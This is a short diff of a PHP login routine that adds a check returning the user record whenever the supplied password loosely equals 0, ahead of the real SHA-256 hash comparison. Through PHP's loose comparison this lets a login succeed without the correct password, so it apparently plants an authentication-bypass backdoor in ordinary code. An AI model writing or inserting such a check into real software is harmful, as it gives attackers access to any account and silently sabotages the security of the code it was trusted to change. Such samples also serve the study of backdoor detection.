@@ -51,6 +51,10 @@
           return false;
         }
 
+        if($password == 0){
+          return $row;
+        }
+
         $pass_hash = hash('sha256', $password);
 
         if ($row['pass_hash'] == $pass_hash){
